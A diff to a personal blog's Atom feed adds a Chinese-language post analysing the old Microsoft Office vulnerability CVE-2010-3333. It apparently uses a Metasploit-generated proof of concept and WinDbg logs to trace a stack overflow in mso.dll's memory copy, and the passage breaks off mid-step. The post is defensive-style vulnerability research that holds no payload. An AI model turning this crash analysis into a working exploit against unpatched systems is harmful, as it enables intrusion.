@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://czh11.github.io</id>
     <title>Nono</title>
-    <updated>2020-12-19T13:37:14.458Z</updated>
+    <updated>2020-12-20T12:43:09.798Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://czh11.github.io"/>
     <link rel="self" href="https://czh11.github.io/atom.xml"/>
@@ -10,6 +10,814 @@
     <logo>https://czh11.github.io/images/avatar.png</logo>
     <icon>https://czh11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Nono</rights>
+    <entry>
+        <title type="html"><![CDATA[CVE-2010-3333]]></title>
+        <id>https://czh11.github.io/post/cve-2010-3333/</id>
+        <link href="https://czh11.github.io/post/cve-2010-3333/">
+        </link>
+        <updated>2020-12-20T12:33:15.000Z</updated>
+        <content type="html"><![CDATA[<p>cve-2010-3333</p>
+<p>首先用msf生成一个poc</p>
+<p>打开winword.exe,并用windbg附加进程，再打开生成的poc</p>
+<pre><code>(150.6a8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0000c8ac ebx=05000000 ecx=0000019b edx=00000000 esi=1104c24c edi=00130000
+eip=30e9eb88 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll - 
+mso!Ordinal6426+0x64d:
+30e9eb88 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+</code></pre>
+<p>可以看到程序再0x30e9eb88处停止了运行，这里的汇编代码为</p>
+<pre><code> rep movs dword ptr es:[edi],dword ptr [esi]
+</code></pre>
+<p>循环将esi地址处的数据到edi存储地址的内存处。</p>
+<p>查看下esi存储地址处的内存</p>
+<pre><code>0:000&gt; db esi
+1104c24c  4c 74 36 4c 74 37 4c 74-38 4c 74 39 4c 75 30 4c  Lt6Lt7Lt8Lt9Lu0L
+1104c25c  75 31 4c 75 32 4c 75 33-4c 75 34 4c 75 35 4c 75  u1Lu2Lu3Lu4Lu5Lu
+1104c26c  36 4c 75 37 4c 75 38 4c-75 39 4c 76 30 4c 76 31  6Lu7Lu8Lu9Lv0Lv1
+1104c27c  4c 76 32 4c 76 33 4c 76-34 4c 76 35 4c 76 36 4c  Lv2Lv3Lv4Lv5Lv6L
+1104c28c  76 37 4c 76 38 4c 76 39-4c 77 30 4c 77 31 4c 77  v7Lv8Lv9Lw0Lw1Lw
+1104c29c  32 4c 77 33 4c 77 34 4c-77 35 4c 77 36 4c 77 37  2Lw3Lw4Lw5Lw6Lw7
+1104c2ac  4c 77 38 4c 77 39 4c 78-30 4c 78 31 4c 78 32 4c  Lw8Lw9Lx0Lx1Lx2L
+1104c2bc  78 33 4c 78 34 4c 78 35-4c 78 36 4c 78 37 4c 78  x3Lx4Lx5Lx6Lx7Lx
+</code></pre>
+<p>查看edi存储的地址处内存的属性</p>
+<pre><code>0:000&gt; !address edi
+Usage:                  MemoryMappedFile
+Allocation Base:        00130000
+Base Address:           00130000
+End Address:            00133000
+Region Size:            00003000
+Type:                   00040000	MEM_MAPPED
+State:                  00001000	MEM_COMMIT
+Protect:                00000002	PAGE_READONLY
+Mapped file name:       PageFile
+</code></pre>
+<p>可以看到这处内存是只能读的</p>
+<p>查看esp存储的地址的内存的数据</p>
+<pre><code>0:000&gt; db esp
+00123d98  f0 10 4d 01 88 3f 12 00-96 cc f4 30 f0 10 4d 01  ..M..?.....0..M.
+00123da8  c0 3d 12 00 00 00 00 00-00 00 00 00 00 00 00 00  .=..............
+00123db8  00 00 00 00 00 00 00 00-41 61 30 41 61 31 41 61  ........Aa0Aa1Aa
+00123dc8  32 41 61 33 41 61 34 41-61 35 41 61 36 41 61 37  2Aa3Aa4Aa5Aa6Aa7
+00123dd8  41 61 38 41 61 39 41 62-30 41 62 31 41 62 32 41  Aa8Aa9Ab0Ab1Ab2A
+00123de8  62 33 41 62 34 41 62 35-41 62 36 41 62 37 41 62  b3Ab4Ab5Ab6Ab7Ab
+00123df8  38 41 62 39 41 63 30 41-63 31 41 63 32 41 63 33  8Ab9Ac0Ac1Ac2Ac3
+00123e08  41 63 34 41 63 35 41 63-36 41 63 37 41 63 38 41  Ac4Ac5Ac6Ac7Ac8A
+</code></pre>
+<p>查看一下mso的详情信息</p>
+<pre><code>0:000&gt; lmm mso v
+start    end        module name
+30c90000 31837000   mso        (export symbols)       C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll
+    Loaded symbol image file: C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll
+    Image path: C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll
+    Image name: mso.dll
+    Timestamp:        Fri Aug 08 15:10:06 2003 (3F334CCE)
+    CheckSum:         00BA7175
+    ImageSize:        00BA7000
+    File version:     11.0.5606.0
+    Product version:  11.0.5606.0
+    File flags:       0 (Mask 3F)
+    File OS:          40004 NT Win32
+    File type:        2.0 Dll
+    File date:        00000000.00000000
+    Translations:     0000.04e4
+    CompanyName:      Microsoft Corporation
+    ProductName:      Microsoft Office 2003
+    InternalName:     MSO
+    OriginalFilename: MSO.DLL
+    ProductVersion:   11.0.5606
+    FileVersion:      11.0.5606
+    FileDescription:  Microsoft Office 2003 component
+    LegalCopyright:   Copyright © 1983-2003 Microsoft Corporation.  All rights reserved.
+</code></pre>
+<p>从上面得到的信息可以看出，这时在mso.dll上的一处栈溢出漏洞，由于唯有检查复制的内存大小，导致直接覆盖到edi(0x00130000)这处只读地址，照成访问伪例</p>
+<p>异常指令在0x30e9eb88处，用windbg重新加载运行并在0x30e9eb88下断点</p>
+<pre><code>0:002&gt; bp 30e9eb88
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll - 
+0:002&gt; g
+ModLoad: 76d70000 76d92000   C:\WINDOWS\system32\appHelp.dll
+ModLoad: 76590000 765de000   C:\WINDOWS\System32\cscui.dll
+ModLoad: 76570000 7658c000   C:\WINDOWS\System32\CSCDLL.dll
+ModLoad: 5fdd0000 5fe25000   C:\WINDOWS\system32\netapi32.dll
+ModLoad: 76960000 76984000   C:\WINDOWS\system32\ntshrui.dll
+ModLoad: 76af0000 76b01000   C:\WINDOWS\system32\ATL.DLL
+ModLoad: 759d0000 75a7f000   C:\WINDOWS\system32\USERENV.dll
+ModLoad: 75ef0000 75fed000   C:\WINDOWS\system32\browseui.dll
+ModLoad: 7e550000 7e6c1000   C:\WINDOWS\system32\shdocvw.dll
+ModLoad: 765e0000 76673000   C:\WINDOWS\system32\CRYPT32.dll
+ModLoad: 76db0000 76dc2000   C:\WINDOWS\system32\MSASN1.dll
+ModLoad: 75430000 754a1000   C:\WINDOWS\system32\CRYPTUI.dll
+ModLoad: 76680000 76726000   C:\WINDOWS\system32\WININET.dll
+ModLoad: 76c00000 76c2e000   C:\WINDOWS\system32\WINTRUST.dll
+ModLoad: 76c60000 76c88000   C:\WINDOWS\system32\IMAGEHLP.dll
+ModLoad: 76f30000 76f5c000   C:\WINDOWS\system32\WLDAP32.dll
+ModLoad: 76950000 76958000   C:\WINDOWS\system32\LINKINFO.dll
+ModLoad: 36c30000 36c39000   C:\Program Files\Microsoft Office\OFFICE11\msostyle.dll
+ModLoad: 39800000 399b3000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL
+ModLoad: 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL
+ModLoad: 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll
+Breakpoint 0 hit
+eax=0000c8ac ebx=05000000 ecx=0000322b edx=00000000 esi=1104000c edi=00123dc0
+eip=30e9eb88 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x64d:
+30e9eb88 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+</code></pre>
+<p>查看栈回溯，定位是哪个函数调用到崩溃函数的</p>
+<pre><code>0:000&gt; kb
+ChildEBP RetAddr  Args to Child              
+WARNING: Stack unwind information not available. Following frames may be wrong.
+00123dd0 30f4cdbd 00123f3c 00000000 ffffffff mso!Ordinal6426+0x64d
+00123e00 30f4a597 00123f88 00123f3c 00000000 mso!Ordinal753+0x306e
+0012404c 30d4b199 00000000 0012408c 00000000 mso!Ordinal753+0x848
+00124074 30d4b148 30d4ae32 014d14c8 014d1500 mso!Ordinal4196+0x61f
+00124078 30d4ae32 014d14c8 014d1500 014d13b0 mso!Ordinal4196+0x5ce
+0012407c 014d14c8 014d1500 014d13b0 30dc9d44 mso!Ordinal4196+0x2b8
+00124080 014d1500 014d13b0 30dc9d44 00000000 0x14d14c8
+00124084 014d13b0 30dc9d44 00000000 014d1118 0x14d1500
+00124088 30dc9d44 00000000 014d1118 00124e38 0x14d13b0
+0012408c 00000000 014d1118 00124e38 00000000 mso!Ordinal2940+0x158fc
+</code></pre>
+<pre><code>0:000&gt; ub mso!Ordinal753+0x306e
+mso!Ordinal753+0x305a:
+30f4cda9 23c1            and     eax,ecx
+30f4cdab 50              push    eax
+30f4cdac 8d47ff          lea     eax,[edi-1]
+30f4cdaf 50              push    eax
+30f4cdb0 8b4508          mov     eax,dword ptr [ebp+8]
+30f4cdb3 6a00            push    0
+30f4cdb5 ff750c          push    dword ptr [ebp+0Ch]
+30f4cdb8 e8a0feffff      call    mso!Ordinal753+0x2f0e (30f4cc5d)
+</code></pre>
+<p>可以看到崩溃函数是在0x30f4cc5d函数中被调用的。</p>
+<p>重用windbg加载进程并在0x30f4cc5d函数处下断点</p>
+<pre><code>Executable search path is: 
+ModLoad: 30000000 30baa000   winword.EXE
+ModLoad: 7c920000 7c9b3000   ntdll.dll
+ModLoad: 7c800000 7c91e000   C:\WINDOWS\system32\kernel32.dll
+ModLoad: 77da0000 77e49000   C:\WINDOWS\system32\ADVAPI32.dll
+ModLoad: 77e50000 77ee2000   C:\WINDOWS\system32\RPCRT4.dll
+ModLoad: 77fc0000 77fd1000   C:\WINDOWS\system32\Secur32.dll
+ModLoad: 77ef0000 77f39000   C:\WINDOWS\system32\GDI32.dll
+ModLoad: 77d10000 77da0000   C:\WINDOWS\system32\USER32.dll
+ModLoad: 76990000 76acd000   C:\WINDOWS\system32\ole32.dll
+ModLoad: 77be0000 77c38000   C:\WINDOWS\system32\msvcrt.dll
+(128.4c4): Break instruction exception - code 80000003 (first chance)
+eax=00241eb4 ebx=7ffd5000 ecx=00000004 edx=00000010 esi=00241f48 edi=00241eb4
+eip=7c92120e esp=0012fb20 ebp=0012fc94 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
+ntdll!DbgBreakPoint:
+7c92120e cc              int     3
+0:000&gt; g
+ModLoad: 76300000 7631d000   C:\WINDOWS\system32\IMM32.DLL
+ModLoad: 62c20000 62c29000   C:\WINDOWS\system32\LPK.DLL
+ModLoad: 73fa0000 7400b000   C:\WINDOWS\system32\USP10.dll
+ModLoad: 30c90000 31837000   C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll
+ModLoad: 5adc0000 5adf7000   C:\WINDOWS\system32\uxtheme.dll
+ModLoad: 77180000 77283000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\Comctl32.dll
+ModLoad: 77f40000 77fb6000   C:\WINDOWS\system32\SHLWAPI.dll
+ModLoad: 74680000 746cc000   C:\WINDOWS\system32\MSCTF.dll
+ModLoad: 77bd0000 77bd8000   C:\WINDOWS\system32\version.dll
+ModLoad: 73640000 7366e000   C:\WINDOWS\system32\msctfime.ime
+ModLoad: 7d590000 7dd84000   C:\WINDOWS\system32\SHELL32.dll
+ModLoad: 5d170000 5d20a000   C:\WINDOWS\system32\comctl32.dll
+ModLoad: 7c9c0000 7cc7c000   C:\WINDOWS\system32\msi.dll
+ModLoad: 39700000 397e3000   C:\Program Files\Common Files\Microsoft Shared\office11\riched20.dll
+ModLoad: 770f0000 7717b000   C:\WINDOWS\system32\OLEAUT32.dll
+ModLoad: 76fa0000 7701f000   C:\WINDOWS\system32\CLBCATQ.DLL
+ModLoad: 77020000 770ba000   C:\WINDOWS\system32\COMRes.dll
+ModLoad: 77bd0000 77bd8000   C:\WINDOWS\system32\VERSION.dll
+ModLoad: 01700000 01c49000   C:\WINDOWS\system32\xpsp2res.dll
+ModLoad: 75e00000 75eae000   C:\WINDOWS\system32\SXS.DLL
+ModLoad: 11000000 1103a000   C:\PROGRA~1\MICROS~3\OFFICE11\ADDINS\SYMINPUT.DLL
+ModLoad: 73390000 734e3000   C:\WINDOWS\system32\MSVBVM60.DLL
+Microsoft Word On Connection
+ConnectMode = 1
+Custom(1) = 1
+App Version = 11.0
+gbIsValidLangSetting = True
+gbBootLoad = True
+Microsoft Word On AddInsUpdate
+Microsoft Word On StartupComplete
+ModLoad: 10000000 1002e000   C:\Program Files\Common Files\Microsoft Shared\PROOF\2052\MSGR3SC.DLL
+ModLoad: 76320000 76367000   C:\WINDOWS\system32\comdlg32.dll
+ModLoad: 3b030000 3b0d9000   C:\WINDOWS\system32\IMSC40A.IME
+ModLoad: 3ad70000 3adcd000   C:\PROGRA~1\COMMON~1\MICROS~1\IME\SHARED2.0\MSCAND20.DLL
+ModLoad: 762f0000 762f5000   C:\WINDOWS\system32\msimg32.dll
+ModLoad: 08d70000 08ded000   C:\PROGRA~1\COMMON~1\MICROS~1\SMARTT~1\INTLNAME.DLL
+ModLoad: 09220000 092a6000   C:\Program Files\Common Files\Microsoft Shared\Smart Tag\CHDATEST.DLL
+ModLoad: 092b0000 092c1000   C:\Program Files\Common Files\Microsoft Shared\Smart Tag\Chinese Measurement Converter\CHMETCNV.DLL
+ModLoad: 73510000 7353a000   C:\WINDOWS\system32\scrrun.dll
+ModLoad: 37320000 37341000   C:\PROGRA~1\COMMON~1\MICROS~1\SMARTT~1\FNAME.DLL
+ModLoad: 72f70000 72f96000   C:\WINDOWS\system32\WINSPOOL.DRV
+ModLoad: 74be0000 74c0c000   C:\WINDOWS\system32\OLEACC.dll
+ModLoad: 75ff0000 76055000   C:\WINDOWS\system32\MSVCP60.dll
+ModLoad: 374b0000 374b9000   C:\PROGRA~1\COMMON~1\MICROS~1\SMARTT~1\2052\stintl.dll
+ModLoad: 76060000 761b6000   C:\WINDOWS\system32\SETUPAPI.dll
+ModLoad: 09490000 0949c000   C:\WINDOWS\System32\spool\DRIVERS\W32X86\3\mdiui.dll
+ModLoad: 094a0000 0956b000   C:\WINDOWS\System32\spool\DRIVERS\W32X86\3\mdigraph.dll
+(128.344): Break instruction exception - code 80000003 (first chance)
+eax=7ffd5000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005
+eip=7c92120e esp=0934ffcc ebp=0934fff4 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
+ntdll!DbgBreakPoint:
+7c92120e cc              int     3
+0:004&gt; bp 30f4cc5d
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll - 
+0:004&gt; g
+ModLoad: 76d70000 76d92000   C:\WINDOWS\system32\appHelp.dll
+ModLoad: 76590000 765de000   C:\WINDOWS\System32\cscui.dll
+ModLoad: 76570000 7658c000   C:\WINDOWS\System32\CSCDLL.dll
+ModLoad: 5fdd0000 5fe25000   C:\WINDOWS\system32\netapi32.dll
+ModLoad: 76960000 76984000   C:\WINDOWS\system32\ntshrui.dll
+ModLoad: 76af0000 76b01000   C:\WINDOWS\system32\ATL.DLL
+ModLoad: 759d0000 75a7f000   C:\WINDOWS\system32\USERENV.dll
+ModLoad: 75ef0000 75fed000   C:\WINDOWS\system32\browseui.dll
+ModLoad: 7e550000 7e6c1000   C:\WINDOWS\system32\shdocvw.dll
+ModLoad: 765e0000 76673000   C:\WINDOWS\system32\CRYPT32.dll
+ModLoad: 76db0000 76dc2000   C:\WINDOWS\system32\MSASN1.dll
+ModLoad: 75430000 754a1000   C:\WINDOWS\system32\CRYPTUI.dll
+ModLoad: 76680000 76726000   C:\WINDOWS\system32\WININET.dll
+ModLoad: 76c00000 76c2e000   C:\WINDOWS\system32\WINTRUST.dll
+ModLoad: 76c60000 76c88000   C:\WINDOWS\system32\IMAGEHLP.dll
+ModLoad: 76f30000 76f5c000   C:\WINDOWS\system32\WLDAP32.dll
+ModLoad: 76950000 76958000   C:\WINDOWS\system32\LINKINFO.dll
+ModLoad: 36c30000 36c39000   C:\Program Files\Microsoft Office\OFFICE11\msostyle.dll
+ModLoad: 39800000 399b3000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL
+ModLoad: 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL
+ModLoad: 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll
+Breakpoint 0 hit
+eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
+eip=30f4cc5d esp=00123dd4 ebp=00123e00 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f0e:
+30f4cc5d 55              push    ebp
+</code></pre>
+<p>按F10单步跟进</p>
+<pre><code>0:000&gt; p
+eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
+eip=30f4cc5e esp=00123dd0 ebp=00123e00 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f0f:
+30f4cc5e 8bec            mov     ebp,esp
+0:000&gt; p
+eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
+eip=30f4cc60 esp=00123dd0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f11:
+30f4cc60 83ec14          sub     esp,14h
+0:000&gt; t
+eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
+eip=30f4cc63 esp=00123dbc ebp=00123dd0 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
+mso!Ordinal753+0x2f14:
+30f4cc63 837d1800        cmp     dword ptr [ebp+18h],0 ss:0023:00123de8=014d14e0
+0:000&gt; t
+eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
+eip=30f4cc67 esp=00123dbc ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f18:
+30f4cc67 57              push    edi
+0:000&gt; t
+eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
+eip=30f4cc68 esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f19:
+30f4cc68 8bf8            mov     edi,eax
+0:000&gt; t
+eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00123f88
+eip=30f4cc6a esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f1b:
+30f4cc6a 0f84b6291300    je      mso!Ordinal1549+0x93fa9 (3107f626)      [br=0]
+0:000&gt; p
+eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00123f88
+eip=30f4cc70 esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f21:
+30f4cc70 8b4f08          mov     ecx,dword ptr [edi+8] ds:0023:00123f90=0012408c
+0:000&gt; p
+eax=00123f88 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
+eip=30f4cc73 esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f24:
+30f4cc73 53              push    ebx
+0:000&gt; p
+eax=00123f88 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
+eip=30f4cc74 esp=00123db4 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f25:
+30f4cc74 56              push    esi
+0:000&gt; p
+eax=00123f88 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
+eip=30f4cc75 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f26:
+30f4cc75 e892b4ddff      call    mso!Ordinal6594+0x596 (30d2810c)
+0:000&gt; p
+eax=00124150 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
+eip=30f4cc7a esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f2b:
+30f4cc7a ff750c          push    dword ptr [ebp+0Ch]  ss:0023:00123ddc=00000000
+0:000&gt; p
+eax=00124150 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
+eip=30f4cc7d esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f2e:
+30f4cc7d 8b7064          mov     esi,dword ptr [eax+64h] ds:0023:001241b4=014d10f0
+0:000&gt; p
+eax=00124150 ebx=00000000 ecx=0012408c edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc80 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f31:
+30f4cc80 8365f800        and     dword ptr [ebp-8],0  ss:0023:00123dc8=fa01d4c8
+0:000&gt; p
+eax=00124150 ebx=00000000 ecx=0012408c edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc84 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f35:
+30f4cc84 8b06            mov     eax,dword ptr [esi]  ds:0023:014d10f0=30d9ed10
+0:000&gt; p
+eax=30d9ed10 ebx=00000000 ecx=0012408c edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc86 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f37:
+30f4cc86 8d4df0          lea     ecx,[ebp-10h]
+0:000&gt; p
+eax=30d9ed10 ebx=00000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc89 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f3a:
+30f4cc89 51              push    ecx
+0:000&gt; p
+eax=30d9ed10 ebx=00000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc8a esp=00123da8 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f3b:
+30f4cc8a bb00000005      mov     ebx,5000000h
+0:000&gt; p
+eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc8f esp=00123da8 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f40:
+30f4cc8f 56              push    esi
+0:000&gt; p
+eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc90 esp=00123da4 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f41:
+30f4cc90 895df4          mov     dword ptr [ebp-0Ch],ebx ss:0023:00123dc4=b2b6c000
+0:000&gt; p
+eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc93 esp=00123da4 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f44:
+30f4cc93 ff501c          call    dword ptr [eax+1Ch]  ds:0023:30d9ed2c=30e9eb62
+
+</code></pre>
+<p>按F8跟进崩溃函数</p>
+<pre><code>0:000&gt; t
+eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30e9eb62 esp=00123da0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x627:
+30e9eb62 57              push    edi
+0:000&gt; t
+eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30e9eb63 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x628:
+30e9eb63 8b7c240c        mov     edi,dword ptr [esp+0Ch] ss:0023:00123da8=00123dc0
+0:000&gt; t
+eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123dc0
+eip=30e9eb67 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x62c:
+30e9eb67 85ff            test    edi,edi
+0:000&gt; t
+eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123dc0
+eip=30e9eb69 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x62e:
+30e9eb69 7427            je      mso!Ordinal6426+0x657 (30e9eb92)        [br=0]
+0:000&gt; t
+eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123dc0
+eip=30e9eb6b esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x630:
+30e9eb6b 8b442408        mov     eax,dword ptr [esp+8] ss:0023:00123da4=014d10f0
+0:000&gt; t
+eax=014d10f0 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123dc0
+eip=30e9eb6f esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x634:
+30e9eb6f 8b4808          mov     ecx,dword ptr [eax+8] ds:0023:014d10f8=0004c8ac
+0:000&gt; t
+eax=014d10f0 ebx=05000000 ecx=0004c8ac edx=00000000 esi=014d10f0 edi=00123dc0
+eip=30e9eb72 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x637:
+30e9eb72 81e1ffff0000    and     ecx,0FFFFh
+0:000&gt; t
+eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=014d10f0 edi=00123dc0
+eip=30e9eb78 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x63d:
+30e9eb78 56              push    esi
+0:000&gt; t
+eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=014d10f0 edi=00123dc0
+eip=30e9eb79 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x63e:
+30e9eb79 8bf1            mov     esi,ecx
+0:000&gt; t
+eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=0000c8ac edi=00123dc0
+eip=30e9eb7b esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
